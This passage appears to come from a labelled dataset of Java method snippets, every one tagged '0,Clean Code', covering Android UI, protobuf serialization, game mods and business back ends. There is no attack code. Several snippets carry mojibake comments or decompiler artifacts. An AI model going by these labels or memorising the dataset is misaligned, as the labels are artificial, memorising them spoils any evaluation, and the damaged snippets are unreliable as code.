    for (int i=deque.size(); i > 0; i--) {
      TreeNode node=deque.removeFirst();
      tmp.add(node.val);
      if (node.left != null)       deque.addLast(node.left);
      if (node.right != null)       deque.addLast(node.right);
    }
    res.add(tmp);
    if (deque.isEmpty())     break;
    tmp=new ArrayList<>();
    for (int i=deque.size(); i > 0; i--) {
      TreeNode node=deque.removeLast();
      tmp.add(node.val);
      if (node.right != null)       deque.addFirst(node.right);
      if (node.left != null)       deque.addFirst(node.left);
    }
    res.add(tmp);
  }
  return res;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)16);
    output.writeUInt32NoTag(mapId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(curRoomId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)88);
    output.writeUInt32NoTag(curSiteId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeRawByte((byte)104);
    output.writeUInt32NoTag(areaId);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    for (int i=0; i < roomList.length(); i++) {
      output.writeRawByte((byte)26);
      output.writeMessageNoTag(roomList.get(i));
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.mapId,mapId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.curRoomId,curRoomId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.curSiteId,curSiteId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeUInt32(FieldNames.areaId,areaId);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    output.writeRepeatedMessage(FieldNames.roomList,roomList);
  }
  output.endObject();
}",0,Clean Code
"@Test public void testBinarisedCategorical() throws URISyntaxException {
  Pair<RowProcessor<Label>,Dataset<Label>> pair=generateBinarisedDataset();
  RowProcessor<Label> rp=pair.getA();
  Dataset<Label> dataset=pair.getB();
  XGBoostClassificationTrainer trainer=new XGBoostClassificationTrainer(50);
  Model<Label> model=trainer.train(dataset);
  SparseTrainer<Regressor> sparseTrainer=new CARTJointRegressionTrainer(4,true);
  LIMEColumnar lime=new LIMEColumnar(new SplittableRandom(1),model,sparseTrainer,1000,rp,tokenizer);
  Map<String,String> testExample=new HashMap<>();
  testExample.put(""A"",""Small"");
  testExample.put(""B"",""4.0"");
  testExample.put(""C"",""4.0"");
  testExample.put(""D"",""Red"");
  testExample.put(""TextField"",""The full text field has more words in it than other fields."");
  Pair<LIMEExplanation,List<Example<Regressor>>> explanation=lime.explainWithSamples(testExample);
  for (  Example<Regressor> e : explanation.getB()) {
    int aCounter=0;
    int bCounter=0;
    int cCounter=0;
    int dCounter=0;
    int textCounter=0;
    for (    Feature f : e) {
      String featureName=f.getName();
      if (featureName.startsWith(""A"")) {
        aCounter++;
      }
 else       if (featureName.startsWith(""B"")) {
        bCounter++;
      }
 else       if (featureName.startsWith(""C"")) {
        cCounter++;
      }
 else       if (featureName.startsWith(""D"")) {
        dCounter++;
      }
 else       if (featureName.startsWith(""TextField"")) {
        textCounter++;
      }
 else {
        fail(""Unknown feature with name "" + featureName);
      }
    }
    if (aCounter != 1) {
      fail(""Should only sample one A feature"");
    }
    if (bCounter != 1) {
      fail(""Should only sample one B feature"");
    }
    if (cCounter != 1) {
      fail(""Should only sample one C feature"");
    }
    if (dCounter != 1) {
      fail(""Should only sample one D feature"");
    }
  }
}",0,Clean Code
"private static Path findJniLibrary(LibTorch libTorch){
  String classifier=libTorch.classifier;
  String version=libTorch.version;
  String djlVersion=libTorch.apiVersion;
  String flavor=libTorch.flavor;
  Path libDir=libTorch.dir.toAbsolutePath();
  Path path=libDir.resolve(djlVersion + '-' + JNI_LIB_NAME);
  if (Files.exists(path)) {
    return path;
  }
  path=libDir.resolve(JNI_LIB_NAME);
  if (Files.exists(path)) {
    return path;
  }
  Path cacheDir=Utils.getEngineCacheDir(""pytorch"");
  Path dir=cacheDir.resolve(version + '-' + flavor+ '-'+ classifier);
  path=dir.resolve(djlVersion + '-' + JNI_LIB_NAME);
  if (Files.exists(path)) {
    return path;
  }
  Matcher matcher=VERSION_PATTERN.matcher(version);
  if (!matcher.matches()) {
    throw new EngineException(""Unexpected version: "" + version);
  }
  version=matcher.group(1);
  try {
    URL url=ClassLoaderUtils.getResource(""jnilib/pytorch.properties"");
    String jniVersion=null;
    if (url != null) {
      Properties prop=new Properties();
      try (InputStream is=Utils.openUrl(url)){
        prop.load(is);
      }
       jniVersion=prop.getProperty(""jni_version"");
      if (jniVersion == null) {
        throw new AssertionError(""No PyTorch jni version found."");
      }
    }
    if (jniVersion == null) {
      downloadJniLib(dir,path,djlVersion,version,classifier,flavor);
      return path;
    }
 else     if (!jniVersion.startsWith(version + '-' + djlVersion)) {
      logger.warn(""Found mismatch PyTorch jni: {}"",jniVersion);
      downloadJniLib(dir,path,djlVersion,version,classifier,flavor);
      return path;
    }
  }
 catch (  IOException e) {
    throw new AssertionError(""Failed to read PyTorch jni properties file."",e);
  }
  Path tmp=null;
  String libPath=""jnilib/"" + classifier + '/'+ flavor+ '/'+ JNI_LIB_NAME;
  logger.info(""Extracting {} to cache ..."",libPath);
  try (InputStream is=ClassLoaderUtils.getResourceAsStream(libPath)){
    Files.createDirectories(dir);
    tmp=Files.createTempFile(dir,""jni"",""tmp"");
    Files.copy(is,tmp,StandardCopyOption.REPLACE_EXISTING);
    Utils.moveQuietly(tmp,path);
    return path;
  }
 catch (  IOException e) {
    throw new EngineException(""Cannot copy jni files"",e);
  }
 finally {
    if (tmp != null) {
      Utils.deleteQuietly(tmp);
    }
  }
}",0,Clean Code
"private void setSlideTransitionProgress(float progress){
  if (SharedConfig.getDevicePerformanceClass() <= SharedConfig.PERFORMANCE_CLASS_LOW) {
    return;
  }
  slideFragmentLite=SharedConfig.getDevicePerformanceClass() <= SharedConfig.PERFORMANCE_CLASS_AVERAGE || !LiteMode.isEnabled(LiteMode.FLAG_CHAT_SCALE);
  slideFragmentProgress=progress;
  if (fragmentView != null) {
    fragmentView.invalidate();
  }
  if (slideFragmentLite) {
    if (filterTabsView != null) {
      filterTabsView.getListView().setTranslationX((isDrawerTransition ? 1 : -1) * AndroidUtilities.dp(slideAmplitudeDp) * (1f - slideFragmentProgress));
      filterTabsView.invalidate();
    }
    if (rightSlidingDialogContainer != null && rightSlidingDialogContainer.getFragmentView() != null) {
      if (!rightFragmentTransitionInProgress) {
        rightSlidingDialogContainer.getFragmentView().setTranslationX((isDrawerTransition ? 1 : -1) * AndroidUtilities.dp(slideAmplitudeDp) * (1f - slideFragmentProgress));
      }
    }
  }
 else {
    final float s=1f - 0.05f * (1f - slideFragmentProgress);
    if (filterTabsView != null) {
      filterTabsView.getListView().setScaleX(s);
      filterTabsView.getListView().setScaleY(s);
      filterTabsView.getListView().setTranslationX((isDrawerTransition ? AndroidUtilities.dp(4) : -AndroidUtilities.dp(4)) * (1f - slideFragmentProgress));
      filterTabsView.getListView().setPivotX(isDrawerTransition ? filterTabsView.getMeasuredWidth() : 0);
      filterTabsView.getListView().setPivotY(0);
      filterTabsView.invalidate();
    }
    if (rightSlidingDialogContainer != null && rightSlidingDialogContainer.getFragmentView() != null) {
      if (!rightFragmentTransitionInProgress) {
        rightSlidingDialogContainer.getFragmentView().setScaleX(s);
        rightSlidingDialogContainer.getFragmentView().setScaleY(s);
        rightSlidingDialogContainer.getFragmentView().setTranslationX((isDrawerTransition ? AndroidUtilities.dp(4) : -AndroidUtilities.dp(4)) * (1f - slideFragmentProgress));
      }
      rightSlidingDialogContainer.getFragmentView().setPivotX(isDrawerTransition ? rightSlidingDialogContainer.getMeasuredWidth() : 0);
      rightSlidingDialogContainer.getFragmentView().setPivotY(0);
    }
  }
}",0,Clean Code
"@Override public void mouseWheelMoved(MouseWheelEvent e){
  if (mCurrentMode == SearchableComponent.MODE_CONTROL) {
    double rotation=e.getPreciseWheelRotation();
    int lastX=mControlTransX;
    if (rotation > 0) {
      mControlTransX+=5;
    }
 else {
      mControlTransX-=5;
    }
    if (mControlTransX < 7) {
      mControlTransX=7;
    }
    if (lastX != mControlTransX) {
      repaint();
    }
  }
 else {
    float delta=e.getPreciseWheelRotation() < 0 ? 0.1f : -0.1f;
    if (codeLocatorWindow.getCodelocatorConfig().isMouseWheelDirection()) {
      delta=-delta;
    }
    if (mScaleRatio <= 1f && delta < 0) {
      mScaleRatio=1f;
      return;
    }
    mScaleRatio+=delta;
    mScaleRatio=Math.max(1f,mScaleRatio);
    if (mScaleRatio == 1f) {
      mTransX=0;
      mTransY=0;
    }
 else     if (mScaleRatio > 1) {
      adjustCanvasTrans(e);
    }
    repaint();
  }
}",0,Clean Code
"/** 
 * 鏌ヨ鍏ㄩ儴瑙掕壊
 * @return data
 */
@Override public List<AdminRoleVO> getAllRoleList(){
  List<AdminRoleVO> records=new ArrayList<>();
  for (  AdminRoleTypeEnum typeEnum : AdminRoleTypeEnum.values()) {
    if (Arrays.asList(0,3,4,5).contains(typeEnum.getType())) {
      continue;
    }
    AdminRoleVO record=new AdminRoleVO();
    record.setName(roleTypeCaseName(typeEnum.getType()));
    record.setPid(typeEnum.getType());
    List<AdminRole> recordList=getRoleByType(typeEnum);
    record.setList(recordList);
    records.add(record);
  }
  return records;
}",0,Clean Code
"/** 
 * decrypt
 * @param param
 * @return
 */
protected String decryptString(DataSourceDO param){
  String decryptStr=param.getPassword();
  try {
    DesUtil desUtil=new DesUtil(DesUtil.DES_KEY);
    decryptStr=desUtil.decrypt(param.getPassword(),""CBC"");
  }
 catch (  Exception exception) {
    log.error(""encrypt error"",exception);
  }
  return decryptStr;
}
",0,Clean Code
"@SuppressWarnings(""NewApi"") private static int computeWidgetFeatures(LauncherAppWidgetProviderInfo providerInfo,AppWidgetHostView hostView){
  int widgetFeatures=0;
  if (providerInfo.isReconfigurable()) {
    widgetFeatures|=FEATURE_RECONFIGURABLE;
  }
  if (providerInfo.isConfigurationOptional()) {
    widgetFeatures|=FEATURE_OPTIONAL_CONFIGURATION;
  }
  if (ATLEAST_S && providerInfo.previewLayout != Resources.ID_NULL) {
    widgetFeatures|=FEATURE_PREVIEW_LAYOUT;
  }
  if (ATLEAST_S && providerInfo.targetCellWidth > 0 || providerInfo.targetCellHeight > 0) {
    widgetFeatures|=FEATURE_TARGET_CELL_SIZE;
  }
  if (providerInfo.minResizeWidth > 0 || providerInfo.minResizeHeight > 0) {
    widgetFeatures|=FEATURE_MIN_SIZE;
  }
  if (ATLEAST_S && providerInfo.maxResizeWidth > 0 || providerInfo.maxResizeHeight > 0) {
    widgetFeatures|=FEATURE_MAX_SIZE;
  }
  if (hostView instanceof LauncherAppWidgetHostView && ((LauncherAppWidgetHostView)hostView).hasEnforcedCornerRadius()) {
    widgetFeatures|=FEATURE_ROUNDED_CORNERS;
  }
  return widgetFeatures;
}",0,Clean Code
"public void loadLayout(String jsonPath) throws IOException, JsonSyntaxException {
  CustomControls layout=LayoutConverter.loadAndConvertIfNecessary(jsonPath);
  if (layout != null) {
    loadLayout(layout);
    updateLoadedFileName(jsonPath);
    return;
  }
  throw new IOException(""Unsupported control layout version"");
}
public void loadLayout(CustomControls controlLayout){
  if (mActionRow == null) {
    mActionRow=new ActionRow(getContext());
    addView(mActionRow);
  }
  removeAllButtons();
  if (mLayout != null) {
    mLayout.mControlDataList=null;
    mLayout=null;
  }
  System.gc();
  mapTable.clear();
  if (controlLayout == null)   return;
  mLayout=controlLayout;
  for (  ControlJoystickData joystick : mLayout.mJoystickDataList) {
    addJoystickView(joystick);
  }
  for (  ControlData button : controlLayout.mControlDataList) {
    addControlView(button);
  }
  for (  ControlDrawerData drawerData : controlLayout.mDrawerDataList) {
    ControlDrawer drawer=addDrawerView(drawerData);
    if (mModifiable)     drawer.areButtonsVisible=true;
  }
  mLayout.scaledAt=LauncherPreferences.PREF_BUTTONSIZE;
  setModified(false);
  mButtons=null;
  getButtonChildren();
}
",0,Clean Code
"/** 
 * Creates an animation which updates the vertical transition progress and updates all the dependent UI using various animation events This method also dictates where along the progress the haptics should be played. As the user scrolls up from workspace or down from AllApps, a drag haptic is being played until the commit point where it plays a commit haptic. Where we play the haptics differs when going from workspace -> allApps and vice versa.
 */
@Override public void setStateWithAnimation(LauncherState toState,StateAnimationConfig config,PendingAnimation builder){
  if (mLauncher.isInState(ALL_APPS) && !ALL_APPS.equals(toState)) {
    if (!config.userControlled && mShouldControlKeyboard) {
      mLauncher.getAppsView().getSearchUiManager().hideSoftwareKeyboard();
    }
    builder.addEndListener(success -> {
      ALL_APPS_PULL_BACK_TRANSLATION.set(this,ALL_APPS_PULL_BACK_TRANSLATION_DEFAULT);
      ALL_APPS_PULL_BACK_ALPHA.set(this,ALL_APPS_PULL_BACK_ALPHA_DEFAULT);
      if (config.userControlled && success && mShouldControlKeyboard) {
        mLauncher.getAppsView().getSearchUiManager().hideSoftwareKeyboard();
      }
      mAllAppScale.updateValue(1f);
    }
);
  }
  if (FeatureFlags.ENABLE_PREMIUM_HAPTICS_ALL_APPS.get() && config.userControlled && Utilities.ATLEAST_S) {
    if (toState == ALL_APPS) {
      builder.addOnFrameListener(new VibrationAnimatorUpdateListener(this,mVibratorWrapper,SWIPE_DRAG_COMMIT_THRESHOLD,1));
    }
 else {
      builder.addOnFrameListener(new VibrationAnimatorUpdateListener(this,mVibratorWrapper,0,SWIPE_DRAG_COMMIT_THRESHOLD));
    }
    builder.addEndListener(mVibratorWrapper::cancelVibrate);
  }
  float targetProgress=toState.getVerticalProgress(mLauncher);
  if (Float.compare(mProgress,targetProgress) == 0) {
    setAlphas(toState,config,builder);
    return;
  }
  Interpolator verticalProgressInterpolator=config.getInterpolator(ANIM_VERTICAL_PROGRESS,config.userControlled ? LINEAR : DECELERATE_1_7);
  Animator anim=createSpringAnimation(mProgress,targetProgress);
  anim.setInterpolator(verticalProgressInterpolator);
  anim.addListener(getProgressAnimatorListener());
  builder.add(anim);
  setAlphas(toState,config,builder);
  if (ALL_APPS.equals(toState) && mLauncher.isInState(NORMAL) && !FeatureFlags.ENABLE_PREMIUM_HAPTICS_ALL_APPS.get()) {
    mLauncher.getAppsView().performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY,HapticFeedbackConstants.FLAG_IGNORE_VIEW_SETTING);
  }
}",0,Clean Code
"@NonNull private static List<CharSequence> getClassHierarchy(@NonNull AccessibilityEvent event){
  List<CharSequence> classHierarchies=new ArrayList<>();
  AccessibilityNodeInfo nodeInfo=event.getSource();
  if (nodeInfo != null) {
    classHierarchies.add(nodeInfo.getClassName());
    int depth=0;
    while (depth < 20) {
      AccessibilityNodeInfo tmpNodeInfo=nodeInfo.getParent();
      if (tmpNodeInfo != null) {
        nodeInfo.recycle();
        nodeInfo=tmpNodeInfo;
        classHierarchies.add(nodeInfo.getClassName());
      }
 else {
        break;
      }
      ++depth;
    }
    try {
      if (depth == 20) {
        classHierarchies.add(""..."");
      }
    }
  finally {
      nodeInfo.recycle();
    }
  }
  Collections.reverse(classHierarchies);
  int size=classHierarchies.size();
  if (size <= 1) {
    return classHierarchies;
  }
  classHierarchies.set(0,""鈹� "" + classHierarchies.get(0));
  for (int i=1; i < size; ++i) {
    StringBuilder sb=new StringBuilder();
    for (int j=1; j < i; ++j) {
      sb.append(' ');
    }
    if (i != (size - 1)) {
      sb.append(""鈹斺敩 "");
    }
 else     sb.append(""鈹斺攢 "");
    sb.append(classHierarchies.get(i));
    classHierarchies.set(i,sb.toString());
  }
  return classHierarchies;
}",0,Clean Code
"@Override public Long exportChangeSalaryRecord(MultipartFile multipartFile){
  UploadExcelBO uploadExcelBO=new UploadExcelBO();
  AdminMessage adminMessage=new AdminMessage();
  adminMessage.setCreateUser(UserUtil.getUserId());
  adminMessage.setCreateTime(LocalDateTime.now());
  adminMessage.setRecipientUser(UserUtil.getUserId());
  adminMessage.setLabel(8);
  adminMessage.setType(AdminMessageEnum.HRM_CHANGE_SALARY_IMPORT.getType());
  Long messageId=adminMessageService.saveOrUpdateMessage(adminMessage);
  uploadExcelBO.setMessageId(messageId);
  uploadExcelBO.setUserInfo(UserUtil.getUser());
  redis.setex(AdminCacheKey.UPLOAD_EXCEL_MESSAGE_PREFIX + messageId.toString(),UPLOAD_EXCEL_EXIST_TIME,0);
  ExcelImport uploadService=new ChangeSalaryExport(uploadExcelBO,multipartFile);
  hrmThreadPoolExecutor.execute(uploadService);
  return messageId;
}",0,Clean Code
"public void setForegroundCompat(Drawable d){
  if (VERSION.SDK_INT >= VERSION_M) {
    ForegroundHelper.setForeground(this,d);
  }
 else {
    if (mForeground != d) {
      mForeground=d;
      mForegroundBoundsChanged=true;
      setWillNotDraw(false);
      mForeground.setCallback(this);
      if (mForeground.isStateful()) {
        mForeground.setState(getDrawableState());
      }
    }
  }
}
",0,Clean Code
"@Override public void onScrollEnd(Video item){
  if (item == null) {
    Log.e(TAG,""Can't scroll. Video is null."");
    return;
  }
  VideoGroup group=item.getGroup();
  if (group == null) {
    Log.e(TAG,""Can't scroll. VideoGroup is null."");
    return;
  }
  Log.d(TAG,""onScrollEnd: Group title: "" + group.getTitle());
  boolean scrollInProgress=mScrollAction != null && !mScrollAction.isDisposed();
  if (!scrollInProgress) {
    continueGroup(group);
  }
}
",0,Clean Code
"static public List<String> readLines(Reader input) throws IOException {
  BufferedReader reader=toBufferedReader(input);
  List<String> list=new ArrayList<String>();
  String line=null;
  for (; ; ) {
    line=reader.readLine();
    if (null != line) {
      list.add(line);
    }
 else {
      break;
    }
  }
  return list;
}
",0,Clean Code
"public static InteractionResult onUse(BlockState state,Level world,BlockPos pos,Player player,InteractionHand hand,BlockHitResult ray){
  if (ray.getDirection() != Direction.UP)   return InteractionResult.PASS;
  if (world.isClientSide)   return InteractionResult.SUCCESS;
  DepotBehaviour behaviour=get(world,pos);
  if (behaviour == null)   return InteractionResult.PASS;
  if (!behaviour.canAcceptItems.get())   return InteractionResult.SUCCESS;
  ItemStack heldItem=player.getItemInHand(hand);
  boolean wasEmptyHanded=heldItem.isEmpty();
  boolean shouldntPlaceItem=AllBlocks.MECHANICAL_ARM.isIn(heldItem);
  ItemStack mainItemStack=behaviour.getHeldItemStack();
  if (!mainItemStack.isEmpty()) {
    player.getInventory().placeItemBackInInventory(mainItemStack);
    behaviour.removeHeldItem();
    world.playSound(null,pos,SoundEvents.ITEM_PICKUP,SoundSource.PLAYERS,.2f,1f + Create.RANDOM.nextFloat());
  }
  ItemStackHandler outputs=behaviour.processingOutputBuffer;
  for (int i=0; i < outputs.getSlots(); i++)   player.getInventory().placeItemBackInInventory(outputs.extractItem(i,64,false));
  if (!wasEmptyHanded && !shouldntPlaceItem) {
    TransportedItemStack transported=new TransportedItemStack(heldItem);
    transported.insertedFrom=player.getDirection();
    transported.prevBeltPosition=.25f;
    transported.beltPosition=.25f;
    behaviour.setHeldItem(transported);
    player.setItemInHand(hand,ItemStack.EMPTY);
    AllSoundEvents.DEPOT_SLIDE.playOnServer(world,pos);
  }
  behaviour.blockEntity.notifyUpdate();
  return InteractionResult.SUCCESS;
}",0,Clean Code
"/** 
 * 鎵ц鏃跺嚭鐜板紓甯�, 鍦ㄦ鎹曡幏骞剁粺涓�澶勭悊
 * @param request   request
 * @param response  response
 * @param exception ex
 */
protected void onAuthenticationFailure(ServletRequest request,ServletResponse response,Exception exception) throws IOException {
  HttpServletResponse resp=(HttpServletResponse)response;
  resp.setContentType(""application/json;charset=utf-8"");
  resp.setStatus(200);
  PrintWriter out=resp.getWriter();
  IRCode authCode=RCode.INTERNAL_SERVER_ERROR;
  if (exception instanceof AuthException) {
    authCode=AuthRCode.getByCode(((AuthException)exception).getCode());
  }
  printStackTrace(authCode,exception);
  R<Object> apiResult=R.fault(authCode.getCode(),authCode.getMsg(),exception.getMessage());
  String resultJson=JsonUtil.toJson(apiResult);
  out.write(resultJson);
  out.flush();
  out.close();
}",0,Clean Code
"public boolean hasBooleanValue(){
switch (constType.type) {
case CodeConstants.TYPE_BOOLEAN:
case CodeConstants.TYPE_CHAR:
case CodeConstants.TYPE_BYTE:
case CodeConstants.TYPE_BYTECHAR:
case CodeConstants.TYPE_SHORT:
case CodeConstants.TYPE_SHORTCHAR:
case CodeConstants.TYPE_INT:
    int value=(Integer)this.value;
  return value == 0 || (DecompilerContext.getOption(IFernflowerPreferences.BOOLEAN_TRUE_ONE) && value == 1);
}
return false;
}",0,Clean Code
"public void checkMediaExistance(){
  checkMediaExistance(true);
}
public void checkMediaExistance(boolean useFileDatabaseQueue){
  File cacheFile=null;
  attachPathExists=false;
  mediaExists=false;
  if (type == TYPE_EXTENDED_MEDIA_PREVIEW) {
    TLRPC.TL_messageExtendedMediaPreview preview=(TLRPC.TL_messageExtendedMediaPreview)messageOwner.media.extended_media;
    if (preview.thumb != null) {
      File file=FileLoader.getInstance(currentAccount).getPathToAttach(preview.thumb,useFileDatabaseQueue);
      if (!mediaExists) {
        mediaExists=file.exists() || preview.thumb instanceof TLRPC.TL_photoStrippedSize;
      }
    }
  }
 else   if (type == TYPE_PHOTO) {
    TLRPC.PhotoSize currentPhotoObject=FileLoader.getClosestPhotoSizeWithSize(photoThumbs,AndroidUtilities.getPhotoSize());
    if (currentPhotoObject != null) {
      File file=FileLoader.getInstance(currentAccount).getPathToMessage(messageOwner,useFileDatabaseQueue);
      if (needDrawBluredPreview()) {
        mediaExists=new File(file.getAbsolutePath() + "".enc"").exists();
      }
      if (!mediaExists) {
        mediaExists=file.exists();
      }
    }
  }
  if (!mediaExists && type == TYPE_GIF || type == TYPE_VIDEO || type == TYPE_FILE || type == TYPE_VOICE || type == TYPE_MUSIC || type == TYPE_ROUND_VIDEO) {
    if (messageOwner.attachPath != null && messageOwner.attachPath.length() > 0) {
      File f=new File(messageOwner.attachPath);
      attachPathExists=f.exists();
    }
    if (!attachPathExists) {
      File file=FileLoader.getInstance(currentAccount).getPathToMessage(messageOwner,useFileDatabaseQueue);
      if (type == TYPE_VIDEO && needDrawBluredPreview() || isVoiceOnce() || isRoundOnce()) {
        mediaExists=new File(file.getAbsolutePath() + "".enc"").exists();
      }
      if (!mediaExists) {
        mediaExists=file.exists();
      }
    }
  }
  if (!mediaExists) {
    TLRPC.Document document=getDocument();
    if (document != null) {
      if (isWallpaper()) {
        mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(document,null,true,useFileDatabaseQueue).exists();
      }
 else {
        mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(document,null,false,useFileDatabaseQueue).exists();
      }
    }
 else     if (type == MessageObject.TYPE_TEXT) {
      TLRPC.PhotoSize currentPhotoObject=FileLoader.getClosestPhotoSizeWithSize(photoThumbs,AndroidUtilities.getPhotoSize());
      if (currentPhotoObject == null) {
        return;
      }
      mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(currentPhotoObject,null,true,useFileDatabaseQueue).exists();
    }
 else     if (type == MessageObject.TYPE_ACTION_PHOTO) {
      TLRPC.Photo photo=messageOwner.action.photo;
      if (photo == null || photo.video_sizes.isEmpty()) {
        return;
      }
      mediaExists=FileLoader.getInstance(currentAccount).getPathToAttach(photo.video_sizes.get(0),null,true,useFileDatabaseQueue).exists();
    }
  }
}",0,Clean Code
"private static Schema getSchemaForValue(Object value){
  if (value instanceof String) {
    return Schema.STRING_SCHEMA;
  }
 else   if (value instanceof Integer) {
    return Schema.INT32_SCHEMA;
  }
 else   if (value instanceof Long) {
    return Schema.INT64_SCHEMA;
  }
 else   if (value instanceof Double) {
    return Schema.FLOAT64_SCHEMA;
  }
 else   if (value instanceof Boolean) {
    return Schema.BOOLEAN_SCHEMA;
  }
 else   if (value instanceof Decimal128) {
    BigDecimal decimalValue=new BigDecimal(value.toString());
    return Decimal.schema(decimalValue.scale());
  }
 else   if (value instanceof Byte) {
    return Schema.BYTES_SCHEMA;
  }
 else   if (value instanceof Binary) {
    return Schema.BYTES_SCHEMA;
  }
 else   if (value instanceof Date) {
    return Timestamp.SCHEMA;
  }
 else   if (value instanceof BsonTimestamp) {
    return Schema.INT64_SCHEMA;
  }
 else {
    return Schema.STRING_SCHEMA;
  }
}",0,Clean Code
"@Override public boolean onPreferenceChange(@NonNull Preference preference,Object o){
  String key="""";
  if (preference == mHome) {
    key=""home"";
  }
 else   if (preference == mSettings) {
    key=""settings"";
  }
 else   if (preference == mSystemUi) {
    key=""systemui"";
  }
 else   if (preference == mSecurityCenter) {
    key=""center"";
  }
 else   if (preference == mDemo) {
    key=""demo"";
  }
  if (!key.isEmpty()) {
    String mPkgList=getProp(""persist.hyperceiler.crash.report"");
    if ((boolean)o) {
      if (mPkgList.isEmpty()) {
        mPkgList=key;
      }
 else {
        mPkgList+="","" + key;
      }
    }
 else {
      mPkgList=mPkgList.replace("","" + key,"""").replace(key,"""");
    }
    ShellInit.getShell().run(""setprop persist.hyperceiler.crash.report \"""" + mPkgList + ""\"""").sync();
  }
  return true;
}
",0,Clean Code
"protected void releaseCodec(){
  log.i(""releaseCodec"");
  availableCodecInfos=null;
  codecInfo=null;
  codecFormat=null;
  resetInputBuffer();
  resetOutputBuffer();
  resetCodecBuffers();
  waitingForKeys=false;
  codecHotswapDeadlineMs=C.TIME_UNSET;
  decodeOnlyPresentationTimestamps.clear();
  largestQueuedPresentationTimeUs=C.TIME_UNSET;
  lastBufferInStreamPresentationTimeUs=C.TIME_UNSET;
  try {
    if (codec != null) {
      decoderCounters.decoderReleaseCount++;
      try {
        codec.stop();
      }
  finally {
        codec.release();
      }
    }
  }
  finally {
    codec=null;
    try {
      if (mediaCrypto != null) {
        mediaCrypto.release();
      }
    }
  finally {
      mediaCrypto=null;
      mediaCryptoRequiresSecureDecoder=false;
      setCodecDrmSession(null);
    }
  }
}
",0,Clean Code
"@Override public SceneCastSkillCsReq mergeFrom(final SceneCastSkillCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasSkillIndex()) {
    setSkillIndex(other.skillIndex);
  }
  if (other.hasCasterId()) {
    setCasterId(other.casterId);
  }
  if (other.hasAttackedGroupId()) {
    setAttackedGroupId(other.attackedGroupId);
  }
  if (other.hasTargetMotion()) {
    getMutableTargetMotion().mergeFrom(other.targetMotion);
  }
  if (other.hasHitTargetEntityIdList()) {
    getMutableHitTargetEntityIdList().addAll(other.hitTargetEntityIdList);
  }
  if (other.hasAssistMonsterWaveList()) {
    getMutableAssistMonsterWaveList().addAll(other.assistMonsterWaveList);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5726628!org.eclipse.jdt.core.dom.MethodDeclaration@493eb844",0,Clean Code
"public static void populate(){
  SkullResourcePackManager.SKULL_SKINS.clear();
  BlockRegistries.CUSTOM_SKULLS.set(Object2ObjectMaps.emptyMap());
  if (!GeyserImpl.getInstance().getConfig().isAddNonBedrockItems()) {
    return;
  }
  GeyserCustomSkullConfiguration skullConfig;
  try {
    GeyserBootstrap bootstrap=GeyserImpl.getInstance().getBootstrap();
    Path skullConfigPath=bootstrap.getConfigFolder().resolve(""custom-skulls.yml"");
    File skullConfigFile=FileUtils.fileOrCopiedFromResource(skullConfigPath.toFile(),""custom-skulls.yml"",Function.identity(),bootstrap);
    skullConfig=FileUtils.loadConfig(skullConfigFile,GeyserCustomSkullConfiguration.class);
  }
 catch (  IOException e) {
    GeyserImpl.getInstance().getLogger().severe(GeyserLocale.getLocaleStringLog(""geyser.config.failed""),e);
    return;
  }
  BlockRegistries.CUSTOM_SKULLS.set(new Object2ObjectOpenHashMap<>());
  List<String> profiles=new ArrayList<>(skullConfig.getPlayerProfiles());
  List<String> usernames=new ArrayList<>(skullConfig.getPlayerUsernames());
  List<String> uuids=new ArrayList<>(skullConfig.getPlayerUUIDs());
  List<String> skinHashes=new ArrayList<>(skullConfig.getPlayerSkinHashes());
  GeyserImpl.getInstance().getEventBus().fire(new GeyserDefineCustomSkullsEvent(){
    @Override public void register(    @NonNull String texture,    @NonNull SkullTextureType type){
switch (type) {
case USERNAME:
        ;
case UUID:
      ;
case PROFILE:
    ;
case SKIN_HASH:
  ;
}
}
}
);
usernames.forEach((username) -> {
String profile=getProfileFromUsername(username);
if (profile != null) {
String skinHash=getSkinHash(profile);
if (skinHash != null) {
skinHashes.add(skinHash);
}
}
}
);
uuids.forEach((uuid) -> {
String profile=getProfileFromUuid(uuid);
if (profile != null) {
String skinHash=getSkinHash(profile);
if (skinHash != null) {
skinHashes.add(skinHash);
}
}
}
);
profiles.forEach((profile) -> {
String skinHash=getSkinHash(profile);
if (skinHash != null) {
skinHashes.add(skinHash);
}
}
);
skinHashes.forEach((skinHash) -> {
if (!skinHash.matches(""^[a-fA-F0-9]+$"")) {
GeyserImpl.getInstance().getLogger().error(""Skin hash "" + skinHash + "" does not match required format ^[a-fA-F0-9]{64}$ and will not be added as a custom block."");
return;
}
try {
SkullResourcePackManager.cacheSkullSkin(skinHash);
BlockRegistries.CUSTOM_SKULLS.register(skinHash,new CustomSkull(skinHash));
}
 catch (IOException e) {
GeyserImpl.getInstance().getLogger().error(""Failed to cache skin for skull texture "" + skinHash + "" This skull will not be added as a custom block."",e);
}
}
);
if (!BlockRegistries.CUSTOM_SKULLS.get().isEmpty()) {
GeyserImpl.getInstance().getLogger().info(""Registered "" + BlockRegistries.CUSTOM_SKULLS.get().size() + "" custom skulls as custom blocks."");
}
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.xgboost.protos.XGBoostOutputConverterProto)) {
    return super.equals(obj);
  }
